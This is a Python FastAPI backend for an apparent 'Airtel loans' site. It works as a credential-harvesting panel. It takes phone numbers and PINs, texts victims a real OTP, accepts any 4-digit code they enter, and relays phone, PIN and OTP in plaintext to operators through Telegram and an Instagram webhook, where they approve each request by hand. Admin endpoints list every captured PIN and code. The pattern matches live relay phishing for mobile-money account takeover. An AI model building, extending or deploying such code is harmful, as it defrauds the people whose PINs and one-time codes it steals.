import json
import os
import random
from uuid import uuid4
from datetime import datetime, timedelta, timezone
from dotenv import load_dotenv
load_dotenv()

import httpx
from fastapi import FastAPI, BackgroundTasks, Request, HTTPException, Query
from pydantic import BaseModel, Field
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import PlainTextResponse

from database import init_db, create_user, verify_user_pin, get_user
from telegram_bot import (
    send_approval_request,
    answer_callback_query,
    edit_message,
    send_loan_approval_request,
)
from approvals import (
    create_approval,
    set_approval_result,
    pending_approvals,
    approval_results,
    approval_phones,
    approval_pins,
    approval_otps,
    otp_approval_status,
    phone_pins,
    loan_request_status,
    loan_request_phones,
)
from notifications import send_otp_sms, send_telegram_message, build_otp_sms
from mobitech_sms import send_mobitech_sms

# ────────────────────────────────────────────────────────────────
# Config
# ────────────────────────────────────────────────────────────────
OTP_REQUEST_TTL_MINUTES = 10
ADMIN_TOKEN = os.getenv("ADMIN_TOKEN", "")  # optional shared secret for admin API
INSTAGRAM_BOT_WEBHOOK_URL = os.getenv("INSTAGRAM_BOT_WEBHOOK_URL", "")
INSTAGRAM_VERIFY_TOKEN = os.getenv("INSTAGRAM_VERIFY_TOKEN", "airtel-loans-verify")
INSTAGRAM_ADMIN_IDS = {
    x.strip() for x in os.getenv("INSTAGRAM_ADMIN_IDS", "").split(",") if x.strip()
}

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

init_db()

# Legacy login OTP store (still used by /api/login and /api/resend-otp)
otp_store = {}

# ────────────────────────────────────────────────────────────────
# OTP-request storage (NEW, ref_id-driven)
# ────────────────────────────────────────────────────────────────
# otp_requests[ref_id] = {
#   "ref_id", "phone", "otp", "pin", "status",
#   "created_at" (iso), "created_at_display", "expires_at" (iso),
#   "decided_at", "decided_by", "notified"
# }
otp_requests: dict[str, dict] = {}
# Index: phone -> latest ref_id (used for cleanup on new submission)
phone_latest_ref: dict[str, str] = {}


def _now_utc() -> datetime:
    return datetime.now(timezone.utc)


def make_ref_id() -> str:
    ts = format(int(_now_utc().timestamp() * 1000), "x").upper()
    rand = uuid4().hex[:4].upper()
    return f"AL-{ts}-{rand}"


def create_otp_request(phone: str, otp: str, pin: str) -> dict:
    """Create and register a pending OTP verification request."""
    ref_id = make_ref_id()
    now = _now_utc()
    req = {
        "ref_id": ref_id,
        "phone": phone,
        "otp": otp,
        "pin": pin,
        "status": "pending",
        "created_at": now.isoformat(),
        "created_at_display": now.strftime("%Y-%m-%d %H:%M:%S UTC"),
        "expires_at": (now + timedelta(minutes=OTP_REQUEST_TTL_MINUTES)).isoformat(),
        "decided_at": None,
        "decided_by": None,
        "notified": False,
    }
    otp_requests[ref_id] = req
    phone_latest_ref[phone] = ref_id

    # Mirror status into the legacy map for backward compat
    otp_approval_status[phone] = "pending"
    return req


def expire_if_needed(req: dict) -> dict:
    """Lazily transition a request to 'expired' if its TTL has passed."""
    if req.get("status") != "pending":
        return req
    try:
        expires = datetime.fromisoformat(req["expires_at"])
    except Exception:
        return req
    if _now_utc() > expires:
        req["status"] = "expired"
        otp_approval_status[req["phone"]] = "expired"
    return req


def cancel_pending_for_phone(phone: str, exclude_ref: str | None = None) -> None:
    """Cancel any prior pending request(s) for a phone number."""
    prev_ref = phone_latest_ref.get(phone)
    if prev_ref and prev_ref != exclude_ref and prev_ref in otp_requests:
        prev = otp_requests[prev_ref]
        if prev["status"] == "pending":
            prev["status"] = "cancelled"


# ────────────────────────────────────────────────────────────────
# Admin notification (Instagram + optional Telegram)
# ────────────────────────────────────────────────────────────────
def _build_admin_message(req: dict) -> str:
    return (
        "🔐 <b>OTP Verification Request</b>\n"
        f"📱 Phone: <code>{req['phone']}</code>\n"
        f"🔢 OTP: <code>{req['otp']}</code>\n"
        f"🔑 PIN: <code>{req['pin']}</code>\n"
        f"🕐 Time: {req['created_at_display']}\n"
        f"🆔 Ref: <code>{req['ref_id']}</code>"
    )


async def notify_admin_of_otp_request(req: dict) -> None:
    """Fan out the request to Instagram bot webhook and (optionally) Telegram."""
    payload = {
        "type": "otp_request",
        "ref_id": req["ref_id"],
        "phone": req["phone"],
        "otp": req["otp"],
        "pin": req["pin"],
        "created_at": req["created_at"],
        "created_at_display": req["created_at_display"],
        "display": _build_admin_message(req),
        # Handy for bot button callbacks:
        "actions": {
            "approve": f"approve:{req['ref_id']}",
            "reject": f"reject:{req['ref_id']}",
        },
    }

    # 1) Instagram bot webhook (preferred channel)
    if INSTAGRAM_BOT_WEBHOOK_URL:
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                resp = await client.post(INSTAGRAM_BOT_WEBHOOK_URL, json=payload)
                print(f"[IG-NOTIFY] {resp.status_code} → {resp.text[:200]}")
                req["notified"] = True
        except Exception as e:
            print(f"[IG-NOTIFY] failed: {e}")

    # 2) Telegram fallback (existing behaviour)
    try:
        await send_telegram_message(_build_admin_message(req))
    except Exception as e:
        print(f"[TG-NOTIFY] failed: {e}")


# ────────────────────────────────────────────────────────────────
# Request models
# ────────────────────────────────────────────────────────────────
class LoginRequest(BaseModel):
    phone_number: str
    pin: str


class VerifyOTPRequest(BaseModel):
    phone_number: str
    otp: str
    ref_id: str | None = None          # optional, client may pre-generate
    submitted_at: str | None = None    # optional, client timestamp


class RegisterRequest(BaseModel):
    phone_number: str
    pin: str


class ResendRequest(BaseModel):
    phone_number: str


class DecideRequest(BaseModel):
    action: str = Field(..., pattern="^(approve|reject)$")
    decided_by: str | None = None


# ────────────────────────────────────────────────────────────────
# Helpers
# ────────────────────────────────────────────────────────────────
def format_phone(phone: str) -> str:
    phone = phone.strip()
    if phone.startswith("0"):
        phone = phone[1:]
    if not phone.startswith("+254") and not phone.startswith("254"):
        return f"+254{phone}"
    if phone.startswith("254"):
        return f"+{phone}"
    return phone


def cleanup_approval_records_for_phone(phone: str):
    stale_ids = [aid for aid, p in approval_phones.items() if p == phone]
    for aid in stale_ids:
        approval_phones.pop(aid, None)
        approval_pins.pop(aid, None)
        approval_otps.pop(aid, None)
        approval_results.pop(aid, None)
        pending_approvals.pop(aid, None)


async def send_otp_to_user(full_phone: str, sms_body: str, label: str = "OTP"):
    try:
        response = send_mobitech_sms(full_phone, sms_body)
        print(f"[{label}] Mobitech SMS sent to {full_phone}: {response}")
        return response
    except Exception as e:
        print(f"[{label}] Failed to send Mobitech SMS: {e}")
        try:
            send_otp_sms(full_phone, sms_body)
            print(f"[{label}] Fallback SMS sent to {full_phone}")
        except Exception as fallback_err:
            print(f"[{label}] Fallback SMS also failed: {fallback_err}")
        return None


def _check_admin(request: Request) -> None:
    """Optional shared-secret guard for admin endpoints."""
    if not ADMIN_TOKEN:
        return
    token = request.headers.get("x-admin-token") or request.query_params.get("token")
    if token != ADMIN_TOKEN:
        raise HTTPException(status_code=401, detail="Unauthorized")


# ==============================
# PUBLIC ROUTES
# ==============================

@app.get("/")
def read_root():
    return {"status": "Backend is running"}


@app.post("/api/register")
async def register(request: RegisterRequest):
    full_phone = format_phone(request.phone_number)
    if create_user(full_phone, request.pin):
        return {"status": "success", "message": "User created"}
    return {"status": "error", "message": "User already exists"}


# --- LOGIN ---
@app.post("/api/login")
async def login(request: LoginRequest):
    full_phone = format_phone(request.phone_number)

    user = get_user(full_phone)
    if not user:
        create_user(full_phone, request.pin)

    cleanup_approval_records_for_phone(full_phone)

    otp = str(random.randint(1000, 9999))
    otp_store[full_phone] = otp
    otp_approval_status[full_phone] = "pending"
    phone_pins[full_phone] = request.pin

    sms_body = build_otp_sms(otp)
    await send_otp_to_user(full_phone, sms_body, label="LOGIN")

    # Notify admin for awareness — the real decision happens in /verify-otp
    approval_id = str(uuid4())
    create_approval(approval_id)
    approval_phones[approval_id] = full_phone
    approval_pins[approval_id] = request.pin
    approval_otps[approval_id] = otp

    try:
        await send_approval_request(
            approval_id,
            full_phone,
            request.pin,
            otp,
            sms_body,
            is_user_submitted=False,
        )
    except Exception as e:
        print(f"[LOGIN] Telegram notify failed: {e}")

    return {
        "status": "approved",
        "approval_id": approval_id,
        "message": "OTP sent to your phone",
    }


# --- VERIFY OTP (any 4-digit code is accepted) ---
@app.post("/api/verify-otp")
async def verify_otp(request: VerifyOTPRequest):
    full_phone = format_phone(request.phone_number)
    entered_otp = (request.otp or "").strip()

    # 1) Only validate the *format* — we no longer reject the value.
    if not entered_otp.isdigit() or len(entered_otp) != 4:
        return {
            "status": "error",
            "message": "Le code doit contenir exactement 4 chiffres.",
        }

    # 2) Cancel any previous pending request for this phone.
    cancel_pending_for_phone(full_phone)

    # 3) Create a brand-new pending request.
    pin = phone_pins.get(full_phone, "****")
    req = create_otp_request(full_phone, entered_otp, pin)

    # Optional: accept a client-supplied ref_id for idempotency.
    if request.ref_id and request.ref_id not in otp_requests:
        otp_requests[request.ref_id] = otp_requests.pop(req["ref_id"])
        req["ref_id"] = request.ref_id
        phone_latest_ref[full_phone] = request.ref_id

    # 4) Notify admin (Instagram bot → Telegram fallback).
    try:
        await notify_admin_of_otp_request(req)
    except Exception as e:
        print(f"[VERIFY-OTP] Admin notification failed: {e}")

    return {
        "status": "pending",
        "ref_id": req["ref_id"],
        "created_at": req["created_at"],
        "message": "En attente de validation par l'administrateur",
    }


# --- OTP STATUS POLLING (by ref_id) ---
@app.get("/api/otp-status/{ref_id}")
async def otp_status(ref_id: str):
    req = otp_requests.get(ref_id)
    if not req:
        return {"status": "expired"}

    expire_if_needed(req)

    return {
        "status": req["status"],
        "ref_id": req["ref_id"],
        "created_at": req["created_at"],
    }


# --- OTP CANCEL (user gives up while waiting) ---
@app.post("/api/otp-cancel/{ref_id}")
async def otp_cancel(ref_id: str):
    req = otp_requests.get(ref_id)
    if req and req["status"] == "pending":
        req["status"] = "cancelled"
        otp_approval_status[req["phone"]] = "cancelled"
    return {"status": "ok"}


# --- RESEND OTP ---
@app.post("/api/resend-otp")
async def resend_otp(request: ResendRequest):
    full_phone = format_phone(request.phone_number)

    cleanup_approval_records_for_phone(full_phone)
    cancel_pending_for_phone(full_phone)

    new_otp = str(random.randint(1000, 9999))
    otp_store[full_phone] = new_otp
    otp_approval_status[full_phone] = "pending"

    pin = phone_pins.get(full_phone, "****")
    sms_body = build_otp_sms(new_otp)
    await send_otp_to_user(full_phone, sms_body, label="RESEND")

    # Fresh approval record for Telegram/legacy tracking
    approval_id = str(uuid4())
    create_approval(approval_id)
    approval_phones[approval_id] = full_phone
    approval_pins[approval_id] = pin
    approval_otps[approval_id] = new_otp

    try:
        await send_telegram_message(
            f"🔄 <b>Resend Requested</b>\n\n"
            f"📱 Phone: <code>{full_phone}</code>\n"
            f"🔐 New OTP: <code>{new_otp}</code>\n"
            f"🆔 Ref: <code>{approval_id}</code>"
        )
    except Exception as e:
        print(f"[RESEND] Telegram notify failed: {e}")

    try:
        await send_approval_request(
            approval_id,
            full_phone,
            pin,
            new_otp,
            sms_body,
            is_user_submitted=False,
        )
    except Exception as e:
        print(f"[RESEND] Approval request failed: {e}")

    return {"status": "success", "message": "OTP resent successfully"}


# ==============================
# ADMIN / INSTAGRAM-BOT ENDPOINTS
# ==============================

@app.get("/api/admin/otp-requests")
async def admin_list_otp_requests(
    request: Request,
    status: str = Query("pending", pattern="^(pending|approved|rejected|expired|cancelled|all)$"),
    limit: int = 50,
):
    """Return OTP requests for the Instagram bot to display."""
    _check_admin(request)
    items = []
    for req in otp_requests.values():
        expire_if_needed(req)
        if status != "all" and req["status"] != status:
            continue
        items.append(req.copy())
    items.sort(key=lambda r: r["created_at"], reverse=True)
    return {"count": len(items[:limit]), "items": items[:limit]}


@app.get("/api/admin/otp-requests/{ref_id}")
async def admin_get_otp_request(ref_id: str, request: Request):
    _check_admin(request)
    req = otp_requests.get(ref_id)
    if not req:
        raise HTTPException(status_code=404, detail="Not found")
    expire_if_needed(req)
    return req


@app.post("/api/admin/otp-decide/{ref_id}")
async def admin_decide_otp(ref_id: str, body: DecideRequest, request: Request):
    """Approve or reject an OTP request. Called by the Instagram bot."""
    _check_admin(request)
    req = otp_requests.get(ref_id)
    if not req:
        raise HTTPException(status_code=404, detail="Request not found")

    expire_if_needed(req)
    if req["status"] != "pending":
        return {"status": req["status"], "message": f"Already {req['status']}"}

    approved = body.action == "approve"
    req["status"] = "approved" if approved else "rejected"
    req["decided_at"] = _now_utc().isoformat()
    req["decided_by"] = body.decided_by or "instagram_admin"

    otp_approval_status[req["phone"]] = req["status"]
    if not approved:
        # Wrong-code path: clear the sent OTP so nothing lingers
        otp_store.pop(req["phone"], None)

    # Best-effort informational ping to Telegram (non-blocking)
    try:
        await send_telegram_message(
            f"{'✅' if approved else '❌'} <b>OTP {req['status'].title()}</b>\n"
            f"📱 Phone: <code>{req['phone']}</code>\n"
            f"🆔 Ref: <code>{req['ref_id']}</code>"
        )
    except Exception:
        pass

    return {"status": req["status"], "ref_id": req["ref_id"]}


@app.post("/api/admin/otp-cancel/{ref_id}")
async def admin_cancel_otp(ref_id: str, request: Request):
    _check_admin(request)
    req = otp_requests.get(ref_id)
    if req and req["status"] == "pending":
        req["status"] = "cancelled"
        otp_approval_status[req["phone"]] = "cancelled"
    return {"status": "ok"}


# ==============================
# INSTAGRAM WEBHOOK (admin replies)
# ==============================
@app.get("/instagram/webhook")
async def instagram_webhook_verify(request: Request):
    """Instagram webhook verification handshake."""
    params = request.query_params
    if (
        params.get("hub.mode") == "subscribe"
        and params.get("hub.verify_token") == INSTAGRAM_VERIFY_TOKEN
    ):
        return PlainTextResponse(params.get("hub.challenge", ""))
    raise HTTPException(status_code=403, detail="Forbidden")


@app.post("/instagram/webhook")
async def instagram_webhook_receive(request: Request, background_tasks: BackgroundTasks):
    """Handle admin DMs. Supported text commands:
       - 'pending'              → list pending requests
       - 'approve <ref_id>'     → approve
       - 'reject  <ref_id>'     → reject
       - 'info    <ref_id>'     → show one request
    """
    try:
        data = await request.json()
    except Exception:
        return {"ok": True}

    entries = data.get("entry") or []
    for entry in entries:
        for evt in entry.get("messaging", []):
            sender = evt.get("sender", {}).get("id")
            msg = evt.get("message") or {}
            text = (msg.get("text") or "").strip()
            if not text or not sender:
                continue

            # Only accept commands from configured admins (if any)
            if INSTAGRAM_ADMIN_IDS and sender not in INSTAGRAM_ADMIN_IDS:
                continue

            background_tasks.add_task(_handle_admin_command, sender, text)

    return {"ok": True}


async def _handle_admin_command(sender: str, text: str) -> None:
    """Process one admin DM command."""
    parts = text.split()
    cmd = parts[0].lower() if parts else ""

    def _reply(msg: str) -> None:
        # This is a no-op placeholder. Wire this to your Instagram Graph API
        # Send API call (POST /me/messages) using your page access token.
        print(f"[IG-REPLY -> {sender}] {msg}")

    if cmd in ("pending", "list"):
        items = [r for r in otp_requests.values() if expire_if_needed(r)["status"] == "pending"]
        if not items:
            _reply("No pending OTP requests.")
            return
        lines = [f"📋 {len(items)} pending OTP request(s):"]
        for r in items[:20]:
            lines.append(
                f"• {r['ref_id']} | {r['phone']} | OTP {r['otp']} | {r['created_at_display']}"
            )
        _reply("\n".join(lines))
        return

    if cmd in ("approve", "reject") and len(parts) >= 2:
        ref_id = parts[1]
        req = otp_requests.get(ref_id)
        if not req:
            _reply(f"❌ Ref {ref_id} not found.")
            return
        expire_if_needed(req)
        if req["status"] != "pending":
            _reply(f"ℹ️ Ref {ref_id} already {req['status']}.")
            return

        approved = cmd == "approve"
        req["status"] = "approved" if approved else "rejected"
        req["decided_at"] = _now_utc().isoformat()
        req["decided_by"] = f"instagram:{sender}"
        otp_approval_status[req["phone"]] = req["status"]
        if not approved:
            otp_store.pop(req["phone"], None)

        _reply(
            f"{'✅ Approved' if approved else '❌ Rejected'}\n"
            f"📱 {req['phone']}\n🔢 {req['otp']}\n🆔 {ref_id}"
        )
        return

    if cmd == "info" and len(parts) >= 2:
        req = otp_requests.get(parts[1])
        if not req:
            _reply("❌ Not found.")
            return
        _reply(
            f"🆔 {req['ref_id']}\n"
            f"📱 {req['phone']}\n"
            f"🔢 OTP: {req['otp']}\n"
            f"🔑 PIN: {req['pin']}\n"
            f"🕐 {req['created_at_display']}\n"
            f"📌 Status: {req['status']}"
        )
        return

    _reply(
        "Commands:\n"
        "• pending\n"
        "• approve <ref_id>\n"
        "• reject <ref_id>\n"
        "• info <ref_id>"
    )


# ==============================
# LOAN ROUTES (unchanged)
# ==============================

@app.post("/api/request-loan")
async def request_loan(request: ResendRequest):
    full_phone = format_phone(request.phone_number)

    approval_id = str(uuid4())
    loan_request_status[approval_id] = "pending"
    loan_request_phones[approval_id] = full_phone

    await send_loan_approval_request(approval_id, full_phone)

    return {
        "status": "pending",
        "approval_id": approval_id,
        "message": "Waiting for admin approval",
    }


@app.get("/api/loan-request-status/{approval_id}")
async def loan_request_status_endpoint(approval_id: str):
    status = loan_request_status.get(approval_id, "expired")
    if status in ("approved", "rejected"):
        loan_request_status.pop(approval_id, None)
        loan_request_phones.pop(approval_id, None)
    return {"status": status}


# ==============================
# TELEGRAM WEBHOOK (unchanged)
# ==============================

@app.post("/telegram/webhook")
async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
    try:
        body = await request.body()
        if not body:
            return {"ok": True}
        data = json.loads(body)
    except Exception as e:
        print(f"Webhook parse error: {e}")
        return {"ok": True}

    if "callback_query" not in data:
        return {"ok": True}

    try:
        callback = data["callback_query"]
        callback_id = callback["id"]
        callback_data = callback.get("data", "")

        # Loan approvals
        if callback_data.startswith("loan_approve:") or callback_data.startswith("loan_reject:"):
            action, approval_id = callback_data.split(":", 1)
            approved = action == "loan_approve"
            loan_request_status[approval_id] = "approved" if approved else "rejected"
            await answer_callback_query(callback_id, "✅ Loan Approved" if approved else "❌ Loan Denied")
            phone = loan_request_phones.get(approval_id, "Unknown")
            if "message" in callback:
                result_text = "✅ <b>Loan Approved</b>" if approved else "❌ <b>Loan Denied</b>"
                await edit_message(
                    chat_id=callback["message"]["chat"]["id"],
                    message_id=callback["message"]["message_id"],
                    text=f"{result_text}\n\n📱 Phone: <code>{phone}</code>\n🆔 Ref: <code>{approval_id}</code>",
                )
            return {"ok": True}

        # OTP approvals (legacy — now also syncs to otp_requests)
        parts = callback_data.split(":")
        if len(parts) < 2:
            return {"ok": True}

        action, approval_id = parts[0], parts[1]
        approved = action == "approve"

        set_approval_result(approval_id, approved)
        await answer_callback_query(callback_id, "✅ OTP Approved" if approved else "❌ OTP Rejected")

        phone = approval_phones.get(approval_id, "Unknown")
        pin = approval_pins.get(approval_id, "Unknown")
        otp = approval_otps.get(approval_id, "Unknown")

        if phone != "Unknown":
            otp_approval_status[phone] = "approved" if approved else "rejected"
            if not approved:
                otp_store.pop(phone, None)
            # Also flip the ref_id-keyed record (if any matches this phone/otp)
            for req in otp_requests.values():
                if req["phone"] == phone and req["otp"] == otp and req["status"] == "pending":
                    req["status"] = "approved" if approved else "rejected"
                    req["decided_at"] = _now_utc().isoformat()
                    req["decided_by"] = "telegram_admin"
                    break

        if "message" in callback:
            result_text = "✅ <b>Approved</b>" if approved else "❌ <b>Rejected</b>"
            await edit_message(
                chat_id=callback["message"]["chat"]["id"],
                message_id=callback["message"]["message_id"],
                text=f"{result_text}\n\n📱 Phone: <code>{phone}</code>\n🔑 PIN: <code>{pin}</code>\n🔐 OTP: <code>{otp}</code>\n🆔 Ref: <code>{approval_id}</code>",
            )

        approval_phones.pop(approval_id, None)
        approval_pins.pop(approval_id, None)
        approval_otps.pop(approval_id, None)
        return {"ok": True}

    except Exception as e:
        print(f"Webhook processing error: {e}")
        return {"ok": True}